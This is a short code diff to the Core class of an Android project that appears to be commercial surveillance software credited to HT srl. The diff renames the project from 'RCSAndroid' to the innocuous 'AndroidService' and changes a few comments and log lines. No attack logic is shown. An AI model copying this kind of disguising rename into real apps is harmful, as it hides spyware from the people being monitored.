@@ -1,7 +1,7 @@
 /* *********************************************
  * Create by : Alberto "Quequero" Pelliccione
  * Company   : HT srl
- * Project   : RCSAndroid
+ * Project   : AndroidService
  * Created   : 01-dec-2010
  **********************************************/
 
@@ -24,9 +24,8 @@ import com.android.service.file.Path;
 import com.android.service.util.Check;
 import com.android.service.util.Utils;
 
-// TODO: Auto-generated Javadoc
 /**
- * The Class CoreThread.
+ * The Class Core, represents
  */
 public class Core extends Activity implements Runnable {
 
@@ -131,7 +130,7 @@ public class Core extends Activity implements Runnable {
 		} catch (final Exception ex) {
 			Log.d("QZ", TAG + " Error: run " + ex);
 		} finally {
-			Log.d("QZ", TAG + " RCSAndroid exit ");
+			Log.d("QZ", TAG + " AndroidService exit ");
 			Utils.sleep(1000);
 			
 			System.runFinalizersOnExit(true);
@@ -224,7 +223,6 @@ public class Core extends Activity implements Runnable {
 			}
 
 			// Da qui in poi inizia la concorrenza dei thread
-
 			if (eventManager.startAll() == false) {
 				Log.d("QZ", TAG + " eventManager FAILED");
 				return false;
